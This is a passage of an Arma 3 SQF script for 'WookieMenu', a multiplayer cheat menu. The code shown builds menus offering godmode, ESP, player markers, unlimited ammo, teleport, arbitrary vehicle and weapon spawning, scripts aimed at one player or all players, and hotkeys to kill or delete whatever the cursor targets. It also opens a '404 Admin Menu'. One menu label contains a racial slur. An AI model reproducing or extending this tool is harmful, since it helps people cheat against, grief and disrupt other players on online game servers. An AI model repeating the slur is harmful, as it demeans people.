		{
			call compile format["%1;", _path];
			_isran = true;
		};

		if (_istoggle == "1") then
		{
			call compile format["%1;", _path];
			_isran = true;

			_toggled = lbData [2, (lbCurSel 2)];
			if (_toggled == "nottoggled") then
			{
				// Set toggled to true & change color
				lbSetData [2, (lbCurSel 2), "toggled"];
				lbSetColor [2, (lbCurSel 2), menu_toggle_on];
				WookieMenu_hax_toggled = WookieMenu_hax_toggled + [(lbCurSel 2)];
			}
			else
			{
				// Set toggled to false & change color
				lbSetData [2, (lbCurSel 2), "nottoggled"];
				lbSetColor [2, (lbCurSel 2), menu_toggle_off];
				WookieMenu_hax_toggled = WookieMenu_hax_toggled - [(lbCurSel 2)];
			};

			_ctrl = 2 call WookieMenu_getControl;
			_ctrl ctrlCommit 0.01;
		};

		if (_isplayer == "1") then
		{
			if ((lbCurSel 1) >= 0) then
			{
				call compile format["[""%1""] %2;", lbtext [1, (lbCurSel 1)], _path];
				_isran = true;
			}
			else
			{
				hint "Script requires a player!";
				_isran = true;
			};
		};

		if (_isplayer == "0" and !_isran) then {call compile format ["%1;", _path];};
	};

	Wookie_Menu_Click_Hax =
	{
		_isran = false;
		_path      = LeHax select ((lbCurSel 2))*7+1;
		_istoggle  = LeHax select ((lbCurSel 2))*7+2;
		_istitle   = LeHax select ((lbCurSel 2))*7+3;
		_issubmenu = LeHax select ((lbCurSel 2))*7+4;
		_isplayer  = LeHax select ((lbCurSel 2))*7+5;
		if ((gettext (configFile >> 'CfgVehicles' >> (LeHax select ((lbCurSel 2))*7) >> 'picture')) != '') then
		{
			_Wookie_Pics = (gettext (configFile >> 'CfgVehicles' >> (LeHax select ((lbCurSel 2))*7) >> 'picture'));
			_show_Wookie_Pics  = format ["
			['<img size=''3'' image=''%1''/>',safezoneX+0.5,safezoneY+1.55,5,0,0,3099] spawn bis_fnc_dynamicText;
			", _Wookie_Pics];
			call compile format["%1;", _show_Wookie_Pics];
		
			
			_Wookie_Menu_txt = (gettext (configFile >> 'CfgVehicles' >> (LeHax select ((lbCurSel 2))*7) >> 'Library' >> 'libTextDesc'));
			_show_Wookie_Menu_txt  = format ["
			['<t size=''0.355''font=''EtelkaMonospaceProBold''shadow=''2''color=''#ffe100''align=''left''>%1</t>',safezoneX+1.35,safezoneY+1.55,5,0,0,3098] spawn bis_fnc_dynamicText;
			", _Wookie_Menu_txt];
			call compile format["%1;", _show_Wookie_Menu_txt];
		
			_isran = true;
		};
		if ((gettext (configFile >> 'cfgWeapons' >> (LeHax select ((lbCurSel 2))*7) >> 'picture')) != '') then 
		{
			_Wookie_Pics_wps = (gettext (configFile >> 'cfgWeapons' >> (LeHax select ((lbCurSel 2))*7) >> 'picture'));
			_show_Wookie_Pics_wps  = format ["
			['<img size=''3'' image=''%1''/>',safezoneX+0.5,safezoneY+1.55,5,0,0,3099] spawn bis_fnc_dynamicText;
			", _Wookie_Pics_wps];
			call compile format["%1;", _show_Wookie_Pics_wps];
			
			_Wookie_Menu_txt_wps = (gettext (configFile >> 'cfgWeapons' >> (LeHax select ((lbCurSel 2))*7) >> 'Library' >> 'libTextDesc'));
			_show_Wookie_Menu_txt_wps  = format ["
			['<t size=''0.355''font=''EtelkaMonospaceProBold''shadow=''2''color=''#ffe100''align=''left''>%1</t>',safezoneX+1.35,safezoneY+1.55,5,0,0,3098] spawn bis_fnc_dynamicText;
			", _Wookie_Menu_txt_wps];
			call compile format["%1;", _show_Wookie_Menu_txt_wps];
		
			_isran = true;
		};
	};

	//Fills the main window with list of scripts
	WookieMenu_fillHax =
	{
		isInSub = false;
		_ctrl = 2 call WookieMenu_getControl;
		lbclear _ctrl;

		LeHax = [];

		LeHax = LeHax + ["----------------------    Main Menu","Main_Menu","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Fun Menu","Funmenu","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Wasteland Menu","Wasteland","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Target Player Scripts","Target","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Target All Players Scripts","All","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Vehicle","Vehicles","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Object","Objects","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Weapon","Weaponz","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    DayZ/Zoombies","DayZ","0","0","1","0",[]];
		LeHax = LeHax + ["","","0","1","0","0",[]];
		LeHax = LeHax + ["==========================================================================================================","","0","1","0","0",[]];
		LeHax = LeHax + ["","","0","1","0","0",[]];
		LeHax = LeHax + ["==== Scripts ====","","0","1","0","0",[]];
		LeHax = LeHax + ["Unlimited Ammo","[] spawn unlim","1","0","0","0",[]];
		LeHax = LeHax + ["No Recoil","[] spawn No_Recoil","1","0","0","0",[]];
		LeHax = LeHax + ["Lower Terrain","[] spawn LowTerrain","1","0","0","0",[]];
		LeHax = LeHax + ["Godmode","[] spawn Wookie_God_MODE","1","0","0","0",[]];
		LeHax = LeHax + ["Cargod","[] spawn Wookie_CarGod_MODE","1","0","0","0",[]];
		LeHax = LeHax + ["Player Markers","[] spawn Wookie_PlayerM","1","0","0","0",[]];
		LeHax = LeHax + ["ESP","[] spawn Wookie_ESP","1","0","0","0",[]];
		LeHax = LeHax + ["Vehicles Markers","[] spawn Wookie_VehM","1","0","0","0",[]];
		LeHax = LeHax + ["Player Shield","[] spawn Wookie_Shield","1","0","0","0",[]];
		LeHax = LeHax + ["Teleport","[] spawn Wookie_Tele","0","0","0","0",[]];
		LeHax = LeHax + ["Heal Self","[] spawn Wookie_HealSelf","0","0","0","0",[]];
		LeHax = LeHax + ["Crate","[] spawn Wookie_SpawnCrate","0","0","0","0",[]];
		LeHax = LeHax + ["Delete Crate","[] spawn Wookie_DelCrate","0","0","0","0",[]];
		LeHax = LeHax + ["","","0","1","0","0",[]];
		LeHax = LeHax + ["-------------------------- Key Binds ---------------------------------------------------------------------------","","0","1","0","0",[]];
		LeHax = LeHax + ["TAB = Open The Menu","","0","1","0","0",[]];
		LeHax = LeHax + ["F2 = Open 404 Admin Menu (Must Run the script first)","","0","1","0","0",[]];
		LeHax = LeHax + ["F3 = Toggle Debug On/Off","","0","1","0","0",[]];
		LeHax = LeHax + ["F5 = Delete Cursor Target","","0","1","0","0",[]];
		LeHax = LeHax + ["F6 = Kill Cursor Target","","0","1","0","0",[]];
		LeHax = LeHax + ["F8 = TP Cursor Target","","0","1","0","0",[]];;

		for [{_num = 0}, {_num <= count(LeHax)-1}, {_num = _num+7}] do
		{
			_index      = _ctrl lbAdd format["%1", LeHax select _num];
			_togglable  = LeHax select (_num+2);
			_istitle    = LeHax select (_num+3);
			_issubmenu  = LeHax select (_num+4);
			_thcolor    = LeHax select (_num+6);
		
			if (count _thcolor == 0) then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_run];
			}
			else
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, _thcolor];
			};
		
			if (_togglable == "1") then
			{
				if (_index in WookieMenu_hax_toggled) then
				{
					_ctrl lbSetData [(lbsize _ctrl)-1, "toggled"];
					_ctrl lbSetColor [(lbsize _ctrl)-1, menu_toggle_on];
				}
				else
				{
					_ctrl lbSetData [(lbsize _ctrl)-1, "nottoggled"];
					_ctrl lbSetColor [(lbsize _ctrl)-1, menu_toggle_off];
				};
			};

			if (_istitle == "1") then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_title];
			};

			if (_issubmenu == "1") then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_sub];
			};
		};
	};

	//Fills the player window with list of players
	WookieMenu_fillPlrs =
	{
		_playableUnits = playableUnits;
		_greenlisted = call Wookie_List;
		if (isNil "Wookie_Added_Greenlist") then {Wookie_Added_Greenlist = [];};


		_ctrl = 1 call WookieMenu_getControl;
		lbclear _ctrl;

		_ctrl lbAdd format["----------------------------------- Player List --------------------------------------------------------------------------------------------------------------------------"];
		_ctrl lbSetColor [(lbsize _ctrl)-1, menu_title];
	
		{
			if ((getPlayerUID _x in _greenlisted) or (getPlayerUID _x in Wookie_Added_Greenlist) && (isPlayer _x) && !(isNull _x)) then 
			{
				_plrpic = "A3\data_f\Flags\flag_uk_co.paa";
				if (vehicle _x == _x) then 
				{
					if (side _x == west) then {_plrpic = "A3\data_f\Flags\flag_uk_co.paa";};
					if (side _x == east) then {_plrpic = "A3\data_f\Flags\flag_uk_co.paa";};
					if (side _x == resistance) then {_plrpic = "A3\data_f\Flags\flag_uk_co.paa";};
					if (side _x == civilian) then {_plrpic = "A3\data_f\Flags\flag_uk_co.paa";};
				}
				else
				{
					_plrpic = (gettext (configFile >> 'CfgVehicles' >> (typeof vehicle _x) >> 'picture'));
				};
				_ctrl lbAdd format["%1", name _x];
				_ctrl lbSetData [(lbsize _ctrl)-1, "1"];
				_ctrl lbSetPicture [(lbsize _ctrl)-1, _plrpic];
				_ctrl lbSetColor [(lbsize _ctrl)-1, color_list];
			};
		} forEach playableUnits;
	
	

		_ctrl lbAdd format["----------------------------------- Player's Within 500m -------------------------------------------------------------------------------------------------------------------------------------------------------------"];
		_ctrl lbSetColor [(lbsize _ctrl)-1, menu_title];
	
		{
			if ((player distance _x < 500) && (_x != player) && (isPlayer _x) && !(isNull _x)) then 
			{
				_plrpic = "A3\data_f\Flags\flag_white_co.paa";
				if (vehicle _x == _x) then 
				{
					_ctrl lbAdd format["%1", name _x];
					_ctrl lbSetData [(lbsize _ctrl)-1, "1"];
					if (side _x == west) then {_plrpic = "A3\data_f\Flags\flag_blue_co.paa";};
					if (side _x == east) then {_plrpic = "A3\data_f\Flags\flag_red_co.paa";};
					if (side _x == resistance) then {_plrpic = "A3\data_f\Flags\flag_green_co.paa";};
					if (side _x == civilian) then {_plrpic = "A3\data_f\Flags\flag_white_co.paa";};
					_ctrl lbSetPicture [(lbsize _ctrl)-1, _plrpic];
				}
				else
				{
					{
						_plrpic = (gettext (configFile >> 'CfgVehicles' >> (typeof vehicle _x) >> 'picture'));
						_ctrl lbAdd format["%1", name _x];
						_ctrl lbSetData [(lbsize _ctrl)-1, "1"];
						_ctrl lbSetPicture [(lbsize _ctrl)-1, _plrpic];
					} forEach crew _x;
				};
				if (side _x == west) then {_ctrl lbSetColor [(lbsize _ctrl)-1, color_bluefor_plr];};
				if (side _x == east) then {_ctrl lbSetColor [(lbsize _ctrl)-1, color_opfor_plr];};
				if (side _x == resistance) then {_ctrl lbSetColor [(lbsize _ctrl)-1, color_resistance_plr];};
				if (side _x == civilian) then {_ctrl lbSetColor [(lbsize _ctrl)-1, color_civilian_plr];};
			};
		} forEach _playableUnits;
	
	
	
	
		_ctrl lbAdd format["----------------------------------- Player's On Foot --------------------------------------------------------------------------------------------------------------------------"];
		_ctrl lbSetColor [(lbsize _ctrl)-1, menu_title];
	
		{
			if ((vehicle _x == _x) && (player distance _x > 500) && (isPlayer _x) && !(isNull _x)) then 
			{
				_plrpic = "A3\data_f\Flags\flag_white_co.paa";
				if (side _x == west) then {_plrpic = "A3\data_f\Flags\flag_blue_co.paa";};
				if (side _x == east) then {_plrpic = "A3\data_f\Flags\flag_red_co.paa";};
				if (side _x == resistance) then {_plrpic = "A3\data_f\Flags\flag_green_co.paa";};
				if (side _x == civilian) then {_plrpic = "A3\data_f\Flags\flag_white_co.paa";};
				if !(getPlayerUID _x in _greenlisted) then
				{
					_ctrl lbAdd format["%1", name _x];
					_ctrl lbSetData [(lbsize _ctrl)-1, "1"];
					_ctrl lbSetPicture [(lbsize _ctrl)-1, _plrpic];
				
					if (!(isNil "Dayz_GUI_R") or !(isNil "dayz_originalPlayer")) then 
					{
						_ctrl lbSetColor [(lbsize _ctrl)-1, color_WookieMenu_blue];
					}
					else
					{
						if (side _x == west) then {_ctrl lbSetColor [(lbsize _ctrl)-1, color_bluefor_plr];};
						if (side _x == east) then {_ctrl lbSetColor [(lbsize _ctrl)-1, color_opfor_plr];};
						if (side _x == resistance) then {_ctrl lbSetColor [(lbsize _ctrl)-1, color_resistance_plr];};
						if (side _x == civilian) then {_ctrl lbSetColor [(lbsize _ctrl)-1, color_civilian_plr];};
					};
				};
			};
		} forEach _playableUnits;


		_ctrl lbAdd format["----------------------------------- Player's In Vehicle's --------------------------------------------------------------------------------------------------------------------------"];
		_ctrl lbSetColor [(lbsize _ctrl)-1, menu_title];
	
		{
			if ((vehicle _x != _x) && (player distance _x > 500) && (isPlayer _x) && !(isNull _x)) then 
			{
				if ((vehicle _x isKindOf "LandVehicle") || (vehicle _x isKindOf "Air") || (vehicle _x isKindOf "Ship")) then 
				{
					if !(getPlayerUID _x in _greenlisted) then
					{
						{
							_ctrl lbAdd format["%1", name _x];
							_ctrl lbSetData [(lbsize _ctrl)-1, "1"];
							_ctrl lbSetPicture [(lbsize _ctrl)-1, (gettext (configFile >> 'CfgVehicles' >> (typeof vehicle _x) >> 'picture'))];
							
							if (!(isNil "Dayz_GUI_R") or !(isNil "dayz_originalPlayer")) then 
							{
								_ctrl lbSetColor [(lbsize _ctrl)-1, color_red];
							}
							else
							{
								if (side _x == west) then {_ctrl lbSetColor [(lbsize _ctrl)-1, color_bluefor_plr];};
								if (side _x == east) then {_ctrl lbSetColor [(lbsize _ctrl)-1, color_opfor_plr];};
								if (side _x == resistance) then {_ctrl lbSetColor [(lbsize _ctrl)-1, color_resistance_plr];};
								if (side _x == civilian) then {_ctrl lbSetColor [(lbsize _ctrl)-1, color_civilian_plr];};
							};
						} forEach crew _x;
					};
				};
			};
		} forEach _playableUnits;
	
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
	};

	// Fills the vehicle menu with list of vehicles
	WookieMenu_fill_Vehicles =
	{
		isInSub = true;
		
		_ctrl = 2 call WookieMenu_getControl;
		lbclear _ctrl;
		
		_execx = '"%1" spawn Veh_Spawn_Shitt';
		
		LeHax = [];
		
		LeHax = LeHax + ["----------------------    Main Menu","Main_Menu","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Fun Menu","Funmenu","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Wasteland Menu","Wasteland","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Target Player Scripts","Target","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Target All Players Scripts","All","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Vehicle","Vehicles","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Object","Objects","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Weapon","Weaponz","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    DayZ/Zoombies","DayZ","0","0","1","0",[]];
		LeHax = LeHax + ["","","0","1","0","0",[]];
		LeHax = LeHax + ["=============================================================================================================================================================================================================================================","","0","1","0","0",[]];
		LeHax = LeHax + ["","","0","1","0","0",[]];
		LeHax = LeHax + ["==== Vehicles ====","","0","1","0","0",[]];
		//LeHax = LeHax + ["Super Heli","[] spawn Wookie_SexyHeliLol","1","0","0","0",[]];
		_cfgvehicles = configFile >> "cfgVehicles";

		for "_i" from 0 to (count _cfgvehicles)-1 do
		{
			_vehicle = _cfgvehicles select _i;
			if (isClass _vehicle) then
			{
				_veh_type = configName _vehicle;
				if ((getNumber (_vehicle >> "scope") == 2) && (getText (_vehicle >> "picture") != "") && (((_veh_type isKindOf "LandVehicle") or (_veh_type isKindOf "Air") or (_veh_type isKindOf "Ship"))) && !((_veh_type isKindOf "ParachuteBase") or (_veh_type isKindOf "BIS_Steerable_Parachute"))) then
				{
					LeHax = LeHax + [_veh_type,format[_execx,_veh_type],"0","0","0","0",[]];
				};
			};
		};
		
		for [{_num = 0}, {_num <= count(LeHax)-1}, {_num = _num+7}] do
		{
			_index      = _ctrl lbAdd format["%1", LeHax select _num];
			_ctrl lbSetPicture [(lbsize _ctrl)-1, (gettext (configFile >> 'CfgVehicles' >> (LeHax select _num) >> 'picture'))];
			_togglable  = LeHax select (_num+2);
			_istitle    = LeHax select (_num+3);
			_issubmenu  = LeHax select (_num+4);
			_thcolor    = LeHax select (_num+6);
		
			if (count _thcolor == 0) then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_run];
			}
			else
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, _thcolor];
			};
		
			if (_togglable == "1") then
			{
				if (_index in WookieMenu_hax_toggled) then
				{
					_ctrl lbSetData [(lbsize _ctrl)-1, "toggled"];
					_ctrl lbSetColor [(lbsize _ctrl)-1, menu_toggle_on];
				}
				else
				{
					_ctrl lbSetData [(lbsize _ctrl)-1, "nottoggled"];
					_ctrl lbSetColor [(lbsize _ctrl)-1, menu_toggle_off];
				};
			};

			if (_istitle == "1") then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_title];
			};

			if (_issubmenu == "1") then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_sub];
			};
		};
		
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
	};

	// Fills the object menu with list of objects
	WookieMenu_fill_Objects =
	{
		isInSub = true;
	
		_ctrl = 2 call WookieMenu_getControl;
		lbclear _ctrl;
		
		_execx = '"%1" spawn Veh_Spawn_Shitt';
	
		LeHax = [];
	
		LeHax = LeHax + ["----------------------    Main Menu","Main_Menu","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Fun Menu","Funmenu","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Wasteland Menu","Wasteland","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Target Player Scripts","Target","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Target All Players Scripts","All","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Vehicle","Vehicles","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Object","Objects","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Weapon","Weaponz","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    DayZ/Zoombies","DayZ","0","0","1","0",[]];
		LeHax = LeHax + ["","","0","1","0","0",[]];
		LeHax = LeHax + ["==========================================================================================================","","0","1","0","0",[]];
		LeHax = LeHax + ["","","0","1","0","0",[]];
		LeHax = LeHax + ["==== Objects ====","","0","1","0","0",[]];
		_cfgobjects = configFile >> "cfgVehicles";
		for "_i" from 0 to (count _cfgobjects)-1 do
		{
			_object = _cfgobjects select _i;
			if (isClass _object) then
			{
				_obj_type = configName _object;
				if ((getNumber (_object >> "scope") == 2) && (getText (_object >> "picture") != "") && !((_obj_type isKindOf "ParachuteBase") or (_obj_type isKindOf "BIS_Steerable_Parachute")) && (_obj_type isKindOf "Building")) then
				{
					LeHax = LeHax + [_obj_type,format[_execx,_obj_type],"0","0","0","0",[]];
				};
			};
		};
	
		for [{_num = 0}, {_num <= count(LeHax)-1}, {_num = _num+7}] do
		{
			_index      = _ctrl lbAdd format["%1", LeHax select _num];
			_togglable  = LeHax select (_num+2);
			_istitle    = LeHax select (_num+3);
			_issubmenu  = LeHax select (_num+4);
			_thcolor    = LeHax select (_num+6);
		
			if (count _thcolor == 0) then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_run];
			}
			else
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, _thcolor];
			};
		
			if (_togglable == "1") then
			{
				if (_index in WookieMenu_hax_toggled) then
				{
					_ctrl lbSetData [(lbsize _ctrl)-1, "toggled"];
					_ctrl lbSetColor [(lbsize _ctrl)-1, menu_toggle_on];
				}
				else
				{
					_ctrl lbSetData [(lbsize _ctrl)-1, "nottoggled"];
					_ctrl lbSetColor [(lbsize _ctrl)-1, menu_toggle_off];
				};
			};

			if (_istitle == "1") then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_title];
			};

			if (_issubmenu == "1") then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_sub];
			};
		};
		
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
	};

	// Fills the weapon menu with list of weapons
	WookieMenu_fill_Weapons =
	{
		isInSub = true;
		_ctrl = 2 call WookieMenu_getControl;
		lbclear _ctrl;
		_execx = "[lbtext [1, (lbCurSel 1)],'%1'] spawn Wep_Spawn_Shitt";
	
		LeHax = [];
	
		LeHax = LeHax + ["----------------------    Main Menu","Main_Menu","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Fun Menu","Funmenu","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Wasteland Menu","Wasteland","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Target Player Scripts","Target","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Target All Players Scripts","All","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Vehicle","Vehicles","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Object","Objects","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Weapon","Weaponz","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    DayZ/Zoombies","DayZ","0","0","1","0",[]];
		LeHax = LeHax + ["","","0","1","0","0",[]];
		LeHax = LeHax + ["==========================================================================================================","","0","1","0","0",[]];
		LeHax = LeHax + ["","","0","1","0","0",[]];
		LeHax = LeHax + ["==== Weapons ====","","0","1","0","0",[]];
		_cfgweapons = configFile >> "cfgWeapons";

		for "_i" from 0 to (count _cfgweapons)-1 do
		{
			_weapon = _cfgweapons select _i;
			if (isClass _weapon) then {
				_wpn_type = configName(_weapon);
				if ((getNumber (_weapon >> "scope") == 2) && (getText (_weapon >> "picture") != "")) then {
					LeHax = LeHax + [_wpn_type,format[_execx,_wpn_type],"0","0","0","0",[]];
				};
			};
		};

		for [{_num = 0}, {_num <= count(LeHax)-1}, {_num = _num+7}] do
		{
			_index      = _ctrl lbAdd format["%1", LeHax select _num];
			_ctrl lbSetPicture [(lbsize _ctrl)-1, (gettext (configFile >> 'cfgWeapons' >> (LeHax select _num) >> 'picture'))];
			_togglable  = LeHax select (_num+2);
			_istitle    = LeHax select (_num+3);
			_issubmenu  = LeHax select (_num+4);
			_thcolor    = LeHax select (_num+6);
		
			if (count _thcolor == 0) then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_run];
			}
			else
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, _thcolor];
			};
		
			if (_togglable == "1") then
			{
				if (_index in WookieMenu_hax_toggled) then
				{
					_ctrl lbSetData [(lbsize _ctrl)-1, "toggled"];
					_ctrl lbSetColor [(lbsize _ctrl)-1, menu_toggle_on];
				}
				else
				{
					_ctrl lbSetData [(lbsize _ctrl)-1, "nottoggled"];
					_ctrl lbSetColor [(lbsize _ctrl)-1, menu_toggle_off];
				};
			};

			if (_istitle == "1") then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_title];
			};

			if (_issubmenu == "1") then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_sub];
			};
		};
		
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
		_ctrl lbAdd format [""];
	};

	WookieMenu_fill_Funmenu =
	{	
		isInSub = false;
	
		_ctrl = 2 call WookieMenu_getControl;
		lbclear _ctrl;

		LeHax = [];

		LeHax = LeHax + ["----------------------    Main Menu","Main_Menu","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Fun Menu","Funmenu","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Wasteland Menu","Wasteland","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Target Player Scripts","Target","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Target All Players Scripts","All","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Vehicle","Vehicles","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Object","Objects","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Weapon","Weaponz","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    DayZ/Zoombies","DayZ","0","0","1","0",[]];
		LeHax = LeHax + ["","","0","1","0","0",[]];
		LeHax = LeHax + ["==========================================================================================================","","0","1","0","0",[]];
		LeHax = LeHax + ["","","0","1","0","0",[]];
		LeHax = LeHax + ["==== Visual Filter ====","","0","1","0","0",[]];
		LeHax = LeHax + ["Remove Visual Filter","[] spawn Wookie_RemoveVF","0","0","0","0",[]];
		LeHax = LeHax + ["Wasteland Filter","[] spawn Wookie_Wasteland_VF","0","0","0","0",[]];
		LeHax = LeHax + ["Black/White Thermal","[] spawn Wookie_BlackNWhite_VF","0","0","0","0",[]];
		LeHax = LeHax + ["Cotton Candy 1","[] spawn Wookie_Cotton_1_VF","0","0","0","0",[]];
		LeHax = LeHax + ["Cotton Candy 2","[] spawn Wookie_Cotton_2_VF","0","0","0","0",[]];
		LeHax = LeHax + ["Cyan/Green","[] spawn Wookie_CyanGreen_VF","0","0","0","0",[]];
		LeHax = LeHax + ["Dark","[] spawn Wookie_Dark_VF","0","0","0","0",[]];
		LeHax = LeHax + ["Dark Blue","[] spawn Wookie_DarkBlue_VF","0","0","0","0",[]];
		LeHax = LeHax + ["Gloomy","[] spawn Wookie_Gloomy_VF","0","0","0","0",[]];
		LeHax = LeHax + ["Dark Golden","[] spawn Wookie_DarkGolden_VF","0","0","0","0",[]];
		LeHax = LeHax + ["Dark Green","[] spawn Wookie_DarkGreen_VF","0","0","0","0",[]];
		LeHax = LeHax + ["High On Christmas","[] spawn Wookie_HighOnXmas_VF","0","0","0","0",[]];
		LeHax = LeHax + ["Niggas Be Faded","[] spawn Wookie_NiggaBeFaded_VF","0","0","0","0",[]];
		LeHax = LeHax + ["Old Timey","[] spawn Wookie_OldTimey_VF","0","0","0","0",[]];
		LeHax = LeHax + ["Pink Lemonade","[] spawn Wookie_PinkLemonade_VF","0","0","0","0",[]];
		LeHax = LeHax + ["Radiation Storm","[] spawn Wookie_Radiation_VF","0","0","0","0",[]];
		LeHax = LeHax + ["Red Blue Gamma","[] spawn Wookie_RedBlue_VF","0","0","0","0",[]];
		LeHax = LeHax + ["Trippin On Shrooms","[] spawn Wookie_Shrooms_VF","0","0","0","0",[]];
